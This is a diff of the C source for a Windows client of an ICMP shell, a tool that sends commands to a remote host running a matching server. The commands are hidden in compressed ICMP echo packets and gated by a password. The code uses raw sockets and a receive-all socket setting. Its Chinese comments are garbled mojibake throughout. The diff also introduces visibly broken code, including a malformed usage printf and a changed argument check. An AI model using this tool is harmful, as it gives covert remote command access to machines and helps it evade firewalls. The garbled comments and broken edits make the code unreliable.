@@ -17,26 +17,26 @@ Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110 - 1301, USA
 
 
 
-ÔËÐÐÔÚ windows ÉÏµÄ¿Í»§¶Ë
+è¿è¡Œåœ¨ windows ä¸Šçš„å®¢æˆ·ç«¯
 
-Ê¹ÓÃ·½·¨
+ä½¿ç”¨æ–¹æ³•
 
 icmp_shell.exe [ip]
-    È»ºóµ¯³öÒ»¸ö ´°¿Ú ÓÃÓÚÖ´ÐÐÃüÁî
+    ç„¶åŽå¼¹å‡ºä¸€ä¸ª çª—å£ ç”¨äºŽæ‰§è¡Œå‘½ä»¤
 
-    ¸ã¸ö¶Ô»°¿òÕæµÄÊÇ¶àÓàµÄ
+    æžä¸ªå¯¹è¯æ¡†çœŸçš„æ˜¯å¤šä½™çš„
 
-    Êý¾ÝÑéÖ¤
-    client ·¢ËÍ ÃÜÂë×Ö·û´®µ½·þÎñ¶Ë  ·þÎñ¶ËÑéÖ¤³É¹¦ÁË ¾Í»á»Ø¸´ Ò»¸ö reply ÏûÏ¢
-    ·ñÔòµÄ»° client ¶Î »áÒòÎª ³¬Ê±¶øÊ§°Ü
+    æ•°æ®éªŒè¯
+    client å‘é€ å¯†ç å­—ç¬¦ä¸²åˆ°æœåŠ¡ç«¯  æœåŠ¡ç«¯éªŒè¯æˆåŠŸäº† å°±ä¼šå›žå¤ ä¸€ä¸ª reply æ¶ˆæ¯
+    å¦åˆ™çš„è¯ client æ®µ ä¼šå› ä¸º è¶…æ—¶è€Œå¤±è´¥
 
-    ºóÆÚÍ¨ÐÅµÄ»° ¶¼»áÊ¹ÓÃÕâ¸öÃÜÂë×Ö·û´®À´½øÐÐ¼ÓÃÜ
+    åŽæœŸé€šä¿¡çš„è¯ éƒ½ä¼šä½¿ç”¨è¿™ä¸ªå¯†ç å­—ç¬¦ä¸²æ¥è¿›è¡ŒåŠ å¯†
 
-    ¿Í»§¶ËÊÕµ½µÄÊý¾Ý¶¼À´×Ô request °ü
-    ¿Í»§¶Ë»á³¢ÊÔÊ¹ÓÃÊäÈëµÄÃÜÂëÀ´½âÃÜÊÕµ½µÄÊý¾Ý  ½âÃÜÕýÈ·µÄÊý¾Ý Ó¦¸ÃÈ«²¿¶¼ÊÇ ×Ö·û´®
+    å®¢æˆ·ç«¯æ”¶åˆ°çš„æ•°æ®éƒ½æ¥è‡ª request åŒ…
+    å®¢æˆ·ç«¯ä¼šå°è¯•ä½¿ç”¨è¾“å…¥çš„å¯†ç æ¥è§£å¯†æ”¶åˆ°çš„æ•°æ®  è§£å¯†æ­£ç¡®çš„æ•°æ® åº”è¯¥å…¨éƒ¨éƒ½æ˜¯ å­—ç¬¦ä¸²
 
-    2013.4.27  RAW  ÊÕµ½µÄ°ü »á¾­¹ý windows  µÄ·À»ðÇ½µÄ¹ýÂË »¹ÊÇ winpcap ¸ãÆð°É
-    ÄáÂê  winpcap ÉÏÃæ»¹ÒªÑ¡Ôñ Íø¿¨ µ°ÌÛ°¡
+    2013.4.27  RAW  æ”¶åˆ°çš„åŒ… ä¼šç»è¿‡ windows  çš„é˜²ç«å¢™çš„è¿‡æ»¤ è¿˜æ˜¯ winpcap æžèµ·å§
+    å°¼çŽ›  winpcap ä¸Šé¢è¿˜è¦é€‰æ‹© ç½‘å¡ è›‹ç–¼å•Š
 */
 
 #include <WinSock2.h>
@@ -46,7 +46,7 @@ icmp_shell.exe [ip]
 #include <mstcpip.h>
 #include <IPHlpApi.h>
 #include "zlib/zlib.h"
-    //#include "resource.h"
+//#include "resource.h"
 
 #pragma comment(lib,"ws2_32")
 #pragma comment(lib,"Iphlpapi.lib")
@@ -54,7 +54,7 @@ icmp_shell.exe [ip]
 #define MAX_BUFF_SIZE 1000
 
 #if _MSC_VER <= 1200
-    void dbg_msg(char *fmt, ...)
+void dbg_msg(char *fmt, ...)
 {
 #ifdef _DEBUG
     va_list args;
@@ -66,7 +66,7 @@ icmp_shell.exe [ip]
     va_end(args);
 #endif
 }
-#else  //Ê¹ÓÃºêÀ´¶¨Òå 
+#else  //ä½¿ç”¨å®æ¥å®šä¹‰ 
 #define dbg_msg(fmt,...) do{\
         printf(##__FUNCTION__##" %d :"##fmt,__LINE__,__VA_ARGS__);\
     }while(0);
@@ -146,16 +146,16 @@ typedef struct ip_address
 } ip_address;
 
 
-typedef struct _IPHeader        // 20×Ö½ÚµÄIPÍ·
+typedef struct _IPHeader        // 20å­—èŠ‚çš„IPå¤´
 {
-    uint8     iphVerLen;      // °æ±¾ºÅºÍÍ·³¤¶È£¨¸÷Õ¼4Î»£©
-    uint8     ipTOS;          // ·þÎñÀàÐÍ
-    uint16    ipLength;       // ·â°ü×Ü³¤¶È£¬¼´Õû¸öIP±¨µÄ³¤¶È
-    uint16    ipID;           // ·â°ü±êÊ¶£¬Î©Ò»±êÊ¶·¢ËÍµÄÃ¿Ò»¸öÊý¾Ý±¨
-    uint16    ipFlags;        // ±êÖ¾
-    uint8     ipTTL;          // Éú´æÊ±¼ä£¬¾ÍÊÇTTL
-    uint8     ipProtocol;     // Ð­Òé£¬¿ÉÄÜÊÇTCP¡¢UDP¡¢ICMPµÈ
-    uint16    ipChecksum;     // Ð£ÑéºÍ
+    uint8     iphVerLen;      // ç‰ˆæœ¬å·å’Œå¤´é•¿åº¦ï¼ˆå„å 4ä½ï¼‰
+    uint8     ipTOS;          // æœåŠ¡ç±»åž‹
+    uint16    ipLength;       // å°åŒ…æ€»é•¿åº¦ï¼Œå³æ•´ä¸ªIPæŠ¥çš„é•¿åº¦
+    uint16    ipID;           // å°åŒ…æ ‡è¯†ï¼ŒæƒŸä¸€æ ‡è¯†å‘é€çš„æ¯ä¸€ä¸ªæ•°æ®æŠ¥
+    uint16    ipFlags;        // æ ‡å¿—
+    uint8     ipTTL;          // ç”Ÿå­˜æ—¶é—´ï¼Œå°±æ˜¯TTL
+    uint8     ipProtocol;     // åè®®ï¼Œå¯èƒ½æ˜¯TCPã€UDPã€ICMPç­‰
+    uint16    ipChecksum;     // æ ¡éªŒå’Œ
     union
     {
         unsigned int   ipSource;
@@ -174,11 +174,11 @@ typedef struct _IPHeader        // 20×Ö½ÚµÄIPÍ·
 
 SOCKET g_sock;
 HANDLE hInputEvent;
-char   g_input_buffer[INPUT_BUFFER_SIZE];  //ÓÃ»§ÊäÈëµÄ Êý¾Ý ¡£¡£¡£
+char   g_input_buffer[INPUT_BUFFER_SIZE];  //ç”¨æˆ·è¾“å…¥çš„ æ•°æ® ã€‚ã€‚ã€‚
 lock  g_input_lock;
 char *g_remote_ip;
-//char *g_password = NULL;
-uint32 g_bind_ip = 0;//±¾µØ°ó¶¨µÄ Ip
+char *g_password = NULL;
+uint32 g_bind_ip = 0;//æœ¬åœ°ç»‘å®šçš„ Ip
 
 HANDLE (__stdcall *pf_IcmpCreateFile)(void) = NULL;
 DWORD (__stdcall *pf_IcmpSendEcho)(
@@ -205,7 +205,7 @@ BOOL load_deps()
             return TRUE;
         }
     }
-    // windows 2000  ÉÏÃæÕâ¸öº¯ÊýÊµÔÚ ICMP.dll Àï
+    // windows 2000  ä¸Šé¢è¿™ä¸ªå‡½æ•°å®žåœ¨ ICMP.dll é‡Œ
     lib = LoadLibraryA("ICMP.DLL");
     if (lib != NULL)
     {
@@ -221,7 +221,7 @@ BOOL load_deps()
 }
 
 /*
-¼ÆËã icmp Êý¾Ý°üµÄ Ð£ÑéºÍ
+è®¡ç®— icmp æ•°æ®åŒ…çš„ æ ¡éªŒå’Œ
 */
 unsigned short checksum(unsigned short *ptr, int nbytes)
 {
@@ -248,7 +248,7 @@ unsigned short checksum(unsigned short *ptr, int nbytes)
     return rs;
 }
 /*
-¹¹½¨Ò»¸ö»Ø¸´°ü
+æž„å»ºä¸€ä¸ªå›žå¤åŒ…
 */
 BOOL  send_icmp_replay_packet(struct icmphdr *request, uint32 ip, char *data, int size)
 {
@@ -322,9 +322,9 @@ DWORD __stdcall Icmp_recv_thread(LPVOID lparam)
             {
                 dbg_msg("icmp reply \n");
             }
-            else if (8 == icmp->type ) //&& g_bind_ip != ip->ipSource)  //È·±£²»ÊÇÎÒÃÇ·¢µÄ°ü
+            else if (8 == icmp->type ) //&& g_bind_ip != ip->ipSource)  //ç¡®ä¿ä¸æ˜¯æˆ‘ä»¬å‘çš„åŒ…
             {
-                char *pdata  = NULL; //·þÎñ¶Ë·¢¹ýÀ´µÄÊý¾Ý
+                char *pdata  = NULL; //æœåŠ¡ç«¯å‘è¿‡æ¥çš„æ•°æ®
                 struct packet_header *phdr = NULL;
                 dbg_msg("icmp request  from %s \n", inet_ntoa(*(struct in_addr *)&ip->ipSource));
                 phdr = (struct packet_header *)(icmp + 1);
@@ -340,16 +340,17 @@ DWORD __stdcall Icmp_recv_thread(LPVOID lparam)
                 {
                     char compress_buff[1024];
                     uLongf  compress_buff_len = sizeof(compress_buff);
+                    char buff[MAX_BUFF_SIZE];
 
                     dbg_msg("packet type is request \n");
-                    // ÎÒÃÇÖ»¹ØÐÄ  request
+                    // æˆ‘ä»¬åªå…³å¿ƒ  request
                     pdata = (char *)(phdr + 1);
                     nbytes -= sizeof(struct icmphdr);
                     nbytes -= sizeof(struct packet_header);
 
                     if (nbytes > 0)
                     {
-                        // ½âÑ¹ËõÊý¾Ý
+                        // è§£åŽ‹ç¼©æ•°æ®
                         if (Z_OK == uncompress(compress_buff, &compress_buff_len, pdata, nbytes))
                         {
                             compress_buff[compress_buff_len] = 0;
@@ -360,8 +361,8 @@ DWORD __stdcall Icmp_recv_thread(LPVOID lparam)
                             dbg_msg("uncompress failed !! \n");
                         }
                     }
-                    //ÏÂÃæ·¢ËÍ »Ø¸´
-                    //ÊÕµ½Õâ¸öÇëÇóµÄÊ±ºò ÎÒÃÇÓ¦¸Ã·¢ËÍ±¾µØµÄÊý¾Ý  ²»¹ÜÓÐÄ¾ÓÐ
+                    //ä¸‹é¢å‘é€ å›žå¤
+                    //æ”¶åˆ°è¿™ä¸ªè¯·æ±‚çš„æ—¶å€™ æˆ‘ä»¬åº”è¯¥å‘é€æœ¬åœ°çš„æ•°æ®  ä¸ç®¡æœ‰æœ¨æœ‰
                     lock_lock(&g_input_lock);
                     //dbg_msg("try send %s \n",g_input_buffer);
                     //memset(buff,0,MAX_BUFF_SIZE);
@@ -369,7 +370,7 @@ DWORD __stdcall Icmp_recv_thread(LPVOID lparam)
                     //strcpy(&buff[1],g_input_buffer);
                     compress_buff[0] = TYPE_REPLY;
                     compress_buff_len = sizeof(compress_buff) - 1;
-                    //Ñ¹ËõÊý¾Ý
+                    //åŽ‹ç¼©æ•°æ®
                     if (strlen(g_input_buffer))
                     {
                         if (Z_OK == compress(&compress_buff[1], &compress_buff_len, g_input_buffer, strlen(g_input_buffer)))
@@ -408,13 +409,15 @@ DWORD __stdcall Icmp_recv_thread(LPVOID lparam)
 
 void Loop_recv_cmd()
 {
+    //static PSTR delims = " \n";
     char line[201];
     ULONG inputLength;
+    PSTR command;
 
     while (TRUE)
     {
         if (!fgets(line, sizeof(line) - 1 , stdin))
-            break; //¿ØÖÆÌ¨ÒÑ¾­±»¹Ø±ÕÁË
+            break; //æŽ§åˆ¶å°å·²ç»è¢«å…³é—­äº†
 
         // Remove the terminating new line character.
 
@@ -500,10 +503,10 @@ __exit:
 }
 
 /*
-²âÊÔÏÂÔ¶³ÌµÄ»úÆ÷ÊÇ²»ÊÇÔËÐÐ×ÅÎÒÃÇµÄ·þÎñ¶Ë³ÌÐò
-Í¨¹ý·¢ËÍÒ»¸ö request °ü È»ºóÈç¹ûÄÇ±ßÕýÔÚÔËÐÐÒ»¸ö·þÎñ¶ËµÄ»°  Èç¹ûÃÜÂëÕýÈ·µÄ»°  ¾Í»áÖ÷¶¯µÄ·¢ËÍ°ü¸øÎÒÃÇ  ¸æËßÎÒÃÇ¼ÓÔØµÄÃÜÔ¿£¨Ò²¾ÍÊÇÃÜÂë£©
+æµ‹è¯•ä¸‹è¿œç¨‹çš„æœºå™¨æ˜¯ä¸æ˜¯è¿è¡Œç€æˆ‘ä»¬çš„æœåŠ¡ç«¯ç¨‹åº
+é€šè¿‡å‘é€ä¸€ä¸ª request åŒ… ç„¶åŽå¦‚æžœé‚£è¾¹æ­£åœ¨è¿è¡Œä¸€ä¸ªæœåŠ¡ç«¯çš„è¯  å¦‚æžœå¯†ç æ­£ç¡®çš„è¯  å°±ä¼šä¸»åŠ¨çš„å‘é€åŒ…ç»™æˆ‘ä»¬  å‘Šè¯‰æˆ‘ä»¬åŠ è½½çš„å¯†é’¥ï¼ˆä¹Ÿå°±æ˜¯å¯†ç ï¼‰
 
- Ã»±ØÒª·¢ËÍÃÜÂë ping Ò»ÏÂ¾ÍÐÐÁË
+ æ²¡å¿…è¦å‘é€å¯†ç  ping ä¸€ä¸‹å°±è¡Œäº†
 */
 BOOL ping_remote_host(char *ip)
 {
@@ -516,7 +519,7 @@ BOOL ping_remote_host(char *ip)
         return FALSE;
     request_buff[0] = TYPE_REQUEST;
     //strcpy(&request_buff[1],"sincoder");
-    if (pf_IcmpSendEcho(hIcmp, inet_addr(ip), &request_buff[0], strlen(&request_buff[1]) + 1, NULL, replybuff, 1024, 3000)) //µÈ´ý3s
+    if (pf_IcmpSendEcho(hIcmp, inet_addr(ip), &request_buff[0], strlen(&request_buff[1]) + 1, NULL, replybuff, 1024, 3000)) //ç­‰å¾…3s
     {
         PICMP_ECHO_REPLY pReply = (PICMP_ECHO_REPLY)replybuff;
         if (pReply->DataSize > 0)
@@ -536,9 +539,9 @@ int main(int argc, char **argv)
     int len = sizeof(struct sockaddr);
     HANDLE hRecvThread;
 
-    if (argc < 2)
+    if (argc < 3)
     {
-        printf("icmp shell \nBy sincoder \nUsage:%s [ip] \n",argv[0]);
+        printf("icmp shell \nBy sincoder \nUsage:%0 [ip] \n");
         return -1;
     }
 
@@ -585,17 +588,17 @@ int main(int argc, char **argv)
     }
 
     dbg_msg("bind on ip : %s \n", inet_ntoa(*(struct in_addr *)&g_bind_ip));
-    set_socket_recv_all(g_sock);  //  vista ÒÔÉÏµÄÏµÍ³±ØÐëÕâÑùÉèÖÃÏÂ ²ÅÄÜÊÕµ½ ping request °ü¡£¡£¡£
+    set_socket_recv_all(g_sock);  //  vista ä»¥ä¸Šçš„ç³»ç»Ÿå¿…é¡»è¿™æ ·è®¾ç½®ä¸‹ æ‰èƒ½æ”¶åˆ° ping request åŒ…ã€‚ã€‚ã€‚
     lock_init(&g_input_lock);
 
     hRecvThread = CreateThread(NULL, 0, Icmp_recv_thread, NULL, 0, NULL);
     dbg_msg("send init command request !! \n");
-    // ·¢ËÍÒ»¸ö°ü Ì½²âÏÂ Ô¶³Ì ÊÇ²»ÊÇ ÕýÔÚÔËÐÐ×ÅÎÒÃÇµÄ ·þÎñ¶Ë
+    // å‘é€ä¸€ä¸ªåŒ… æŽ¢æµ‹ä¸‹ è¿œç¨‹ æ˜¯ä¸æ˜¯ æ­£åœ¨è¿è¡Œç€æˆ‘ä»¬çš„ æœåŠ¡ç«¯
     if (ping_remote_host(g_remote_ip))
     {
         dbg_msg("ping host %s OK !! \n", g_remote_ip);
-        //¶Ô·½¿ÉÒÔ Ping µÄ Í¨
-        Loop_recv_cmd();  //½ÓÊÕÓÃ»§µÄÊäÈë
+        //å¯¹æ–¹å¯ä»¥ Ping çš„ é€š
+        Loop_recv_cmd();  //æŽ¥æ”¶ç”¨æˆ·çš„è¾“å…¥
     }
 
     dbg_msg("last error : %d \n", GetLastError());
